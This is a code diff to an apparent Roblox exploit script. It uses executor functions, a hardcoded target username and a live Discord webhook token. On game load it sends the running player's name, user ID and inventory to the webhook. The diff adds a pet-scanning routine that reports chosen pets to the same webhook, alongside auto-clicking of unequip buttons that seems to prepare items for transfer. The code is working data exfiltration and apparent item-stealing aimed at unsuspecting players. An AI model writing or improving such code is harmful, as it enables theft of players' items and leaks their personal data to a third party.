@@ -9,6 +9,9 @@ local scrollingFrame = petList:WaitForChild("Frame"):WaitForChild("Notepad"):Wai
 local TARGET_USERNAME = "Only1sherifalt1"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1516479845503205476/w2eyZPIVUgR9-ZWO1_yRZT9ws7aYpakwqhpjTEN90uFVSDmx_Vxg_EJK3T77zYhNm8h9"
 
+-- Target pets to log (so we know their exact Inv_Pets: name format)
+local TARGET_PETS = { "bunny", "robin", "frog", "deer" }
+
 local FRUITS = {
     "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple",
     "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean",
@@ -62,15 +65,32 @@ end
 local HttpService = game:GetService("HttpService")
 local requestFunc = (syn and syn.request) or (http and http.request) or request
 
--- Send backpack contents to Discord webhook (with emojis + nicer layout)
+-- Helper: pick an accent color based on how full the inventory is
+local function accentColor(n)
+    if n == 0 then return 0x95A5A6 end          -- grey  (empty)
+    if n < 5  then return 0x3498DB end          -- blue  (light)
+    if n < 15 then return 0x2ECC71 end          -- green (decent)
+    if n < 30 then return 0xF1C40F end          -- gold  (rich)
+    return 0xE74C3C                              -- red   (loaded)
+end
+
+-- Helper: pad a string to fixed width (for monospace tables)
+local function pad(s, w)
+    s = tostring(s)
+    if #s >= w then return s:sub(1, w) end
+    return s .. string.rep(" ", w - #s)
+end
+
+-- Send backpack contents to Discord webhook (rich, polished embed)
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
     if not backpack then warn("Backpack not found") return end
 
-    local items = {}
+    local equipped, unequipped = {}, {}
+
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            table.insert(items, "• " .. tool.Name)
+            table.insert(unequipped, tool.Name)
         end
     end
 
@@ -78,46 +98,183 @@ local function sendBackpackToWebhook()
     if character then
         for _, tool in ipairs(character:GetChildren()) do
             if tool:IsA("Tool") then
-                table.insert(items, "• " .. tool.Name .. " 🟢 *(equipped)*")
+                table.insert(equipped, tool.Name)
             end
         end
     end
 
-    local itemList = #items > 0 and table.concat(items, "\n") or "*No items found*"
-    if #itemList > 1020 then
-        itemList = itemList:sub(1, 1015) .. "\n..."
+    local total = #equipped + #unequipped
+
+    -- Build a monospace table for items
+    local function buildTable(list, marker)
+        if #list == 0 then return "```\n— none —\n```" end
+        local lines = { "```ansi" }
+        for i, name in ipairs(list) do
+            table.insert(lines, string.format("%s %s %s",
+                pad(tostring(i) .. ".", 4),
+                marker,
+                name
+            ))
+            if #table.concat(lines, "\n") > 950 then
+                table.insert(lines, "…")
+                break
+            end
+        end
+        table.insert(lines, "```")
+        return table.concat(lines, "\n")
     end
 
+    local equippedBlock   = buildTable(equipped,   "[E]")
+    local unequippedBlock = buildTable(unequipped, "[•]")
+
     local payload = HttpService:JSONEncode({
-        username = "🎒 Inventory Bot",
+        username   = "Inventory Tracker",
         avatar_url = "https://cdn-icons-png.flaticon.com/512/2674/2674472.png",
         embeds = {{
-            title = "📋 Player Inventory Report",
-            description = "🎮 A new player has joined — here's their backpack snapshot.",
-            color = 0x5865F2,
+            author = {
+                name     = localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")",
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
+                url      = "https://www.roblox.com/users/" .. tostring(localPlayer.UserId) .. "/profile"
+            },
+            title       = "🎒  Player Inventory Snapshot",
+            url         = "https://www.roblox.com/users/" .. tostring(localPlayer.UserId) .. "/profile",
+            description = "> 🎮 **A new session has started.**\n> Capturing backpack & equipped tools below.\n\u{200B}",
+            color       = accentColor(total),
             thumbnail = {
                 url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png"
             },
             fields = {
-                { name = "👤 Username",     value = "`" .. localPlayer.Name .. "`",        inline = true },
-                { name = "🪪 Display Name", value = "`" .. localPlayer.DisplayName .. "`", inline = true },
-                { name = "🆔 User ID",      value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
-                { name = "🎒 Items in Backpack (" .. #items .. ")", value = itemList }
+                { name = "👤 Username",     value = "```yaml\n" .. localPlayer.Name        .. "\n```", inline = true },
+                { name = "🪪 Display Name", value = "```yaml\n" .. localPlayer.DisplayName .. "\n```", inline = true },
+                { name = "🆔 User ID",      value = "```yaml\n" .. tostring(localPlayer.UserId) .. "\n```", inline = true },
+
+                { name = "📊 Stats", value = string.format(
+                    "🟢 Equipped: **%d**   •   🎒 Backpack: **%d**   •   📦 Total: **%d**",
+                    #equipped, #unequipped, total
+                ), inline = false },
+
+                { name = "\u{200B}", value = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", inline = false },
+
+                { name = "🟢 Equipped Tools (" .. #equipped .. ")",     value = equippedBlock,   inline = false },
+                { name = "🎒 Backpack Items (" .. #unequipped .. ")", value = unequippedBlock, inline = false },
             },
-            footer = { text = "⏱ Reported at game load" },
+            footer = {
+                text     = "Inventory Tracker • Reported at game load",
+                icon_url = "https://cdn-icons-png.flaticon.com/512/2111/2111370.png"
+            },
             timestamp = DateTime.now():ToIsoDate()
         }}
     })
 
     pcall(function()
         requestFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = payload
+            Body    = payload
         })
         print("Inventory report sent to Discord for: " .. localPlayer.Name)
     end)
+end
+
+-- Send a rich embed to Discord (used for pet logging)
+local function sendEmbed(title, description, color, fields)
+    local payload = HttpService:JSONEncode({
+        username   = "Pet Logger",
+        avatar_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png",
+        embeds = {{
+            author = {
+                name     = localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")",
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
+            },
+            title       = title,
+            description = description,
+            color       = color or 0xF1C40F,
+            fields      = fields or {},
+            footer = {
+                text     = "Pet detection • " .. localPlayer.Name,
+                icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    })
+    pcall(function()
+        requestFunc({
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = payload
+        })
+    end)
+end
+
+-- Emoji map for known target pets
+local PET_EMOJI = {
+    bunny = "🐰",
+    robin = "🐦",
+    frog  = "🐸",
+    deer  = "🦌"
+}
+
+-- Scan inventoryFrame for any Inv_Pets:* and log matches to console + webhook
+local alreadyLogged = {}
+local function logTargetPets(inventoryFrame)
+    local foundFields = {}
+    local totalPets = 0
+    for _, child in ipairs(inventoryFrame:GetChildren()) do
+        local name = child.Name
+        if name:sub(1, 9) == "Inv_Pets:" then
+            local petPart = name:sub(10):lower()
+            for _, target in ipairs(TARGET_PETS) do
+                if petPart:find(target, 1, true) and not alreadyLogged[name] then
+                    alreadyLogged[name] = true
+
+                    -- Try to read count
+                    local count = "?"
+                    local innerFrame = child:FindFirstChildWhichIsA("Frame")
+                    local countLabel = child:FindFirstChild("Count", true)
+                        or child:FindFirstChild("Amount", true)
+                        or (innerFrame and innerFrame:FindFirstChildWhichIsA("TextLabel"))
+                    if countLabel and countLabel.Text then
+                        local n = countLabel.Text:match("%d+")
+                        if n then count = n end
+                    end
+
+                    local emoji = PET_EMOJI[target] or "🐾"
+                    totalPets += (tonumber(count) or 1)
+
+                    table.insert(foundFields, {
+                        name   = emoji .. "  " .. target:sub(1,1):upper() .. target:sub(2),
+                        value  = "```yaml\nname:  " .. name .. "\ncount: " .. tostring(count) .. "\n```",
+                        inline = true
+                    })
+
+                    print("[PET LOG] " .. emoji .. " Found: " .. name .. " (x" .. tostring(count) .. ")")
+                end
+            end
+        end
+    end
+
+    if #foundFields > 0 then
+        -- pad with invisible field to keep 3-column layout clean
+        while (#foundFields % 3) ~= 0 do
+            table.insert(foundFields, { name = "\u{200B}", value = "\u{200B}", inline = true })
+        end
+
+        table.insert(foundFields, 1, {
+            name  = "📊 Summary",
+            value = string.format("Detected **%d** target pet entries • total stack: **%d**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                                  #foundFields, totalPets),
+            inline = false
+        })
+
+        sendEmbed(
+            "🐾  Target Pets Detected",
+            "> Logged `Inv_Pets:` entries matching the watchlist:\n> 🐰 bunny • 🐦 robin • 🐸 frog • 🦌 deer\n\u{200B}",
+            0x2ECC71,
+            foundFields
+        )
+    end
 end
 
 local function clickButton(button)
@@ -135,7 +292,7 @@ local function safeClick(button)
     if not button then return end
     pcall(function() firesignal(button.Activated) end)
     pcall(function() firesignal(button.MouseButton1Click) end)
-    
+
     if getconnections then
         for _, connection in pairs(getconnections(button.Activated)) do
             pcall(function() connection:Fire() end)
@@ -161,15 +318,15 @@ end
 local function runSequence()
     safeClick(toggleButton)
     task.wait(1.0)
-    
+
     local unequipButton = findNextUnequipButton()
-    
+
     while unequipButton do
         safeClick(unequipButton)
-        task.wait(0.4) 
+        task.wait(0.4)
         unequipButton = findNextUnequipButton()
     end
-    
+
     task.wait(0.5)
     safeClick(toggleButton)
 end
@@ -308,6 +465,9 @@ local function runScript()
 
     print("Found InventoryFrame: " .. inventoryFrame:GetFullName())
     task.wait(0.5)
+
+    -- Log target pets (bunny / robin / frog / deer) for inventory mapping
+    pcall(function() logTargetPets(inventoryFrame) end)
 
     -- Check if anything left
     if not hasAnythingToSend(inventoryFrame) then
